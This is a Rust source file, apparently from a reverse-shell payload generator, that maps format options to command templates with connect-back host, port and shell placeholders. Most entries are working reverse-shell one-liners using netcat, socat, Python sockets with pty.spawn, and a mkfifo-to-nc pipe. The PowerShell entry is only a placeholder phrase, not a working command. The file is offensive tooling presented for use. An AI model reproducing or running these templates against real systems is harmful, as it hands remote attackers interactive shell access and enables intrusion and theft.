pub struct Template {
    pub name: &'static str,
    pub description: &'static str,
    pub template: &'static str,
}

use super::Format;

pub fn get_template(format: &Format) -> Template {
    match format {
        Format::Netcat => Template {
            name: "Netcat",
            description: "Basic TCP connection using netcat (You're better than this!!!)",
            template: "nc <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> -e <SHELL>",
        },
        Format::NetcatExe => Template {
            name: "Netcat.exe",
            description: "Basic TCP connection using netcat(nc.exe), for Windows (You're better than this!!!)",
            template: "nc.exe <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> -e <SHELL>",
        },
        Format::Socat => Template {
            name: "Socat",
            description: "TCP connection using socat",
            template: "socat TCP:<CONNECT_BACK_HOST>:<CONNECT_BACK_PORT> EXEC:'<SHELL>',pty,stderr,setsid,sigint,sane",
        },
        Format::Powershell => Template {
            name: "PowerShell",
            description: "Windows PowerShell connection",
            template: "<CONNECT_BACK_HOST>:<CONNECT_BACK_PORT> using <SHELL>",
        },
        Format::Python3 => Template {
            name: "Python3",
            description: "Python3 TCP Reverse Shell",
            template: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<CONNECT_BACK_HOST>\",<CONNECT_BACK_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"<SHELL>\")'",
        },
        Format::Mkfifo => Template {
            name: "Mkfifo",
            description: "Mkfifo Netcat TCP Reverse Shell (Requires Netcat)",
            template: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<SHELL> -i 2>&1|nc <CONNECT_BACK_HOST> <CONNECT_BACK_PORT> >/tmp/f",
        },
    }
}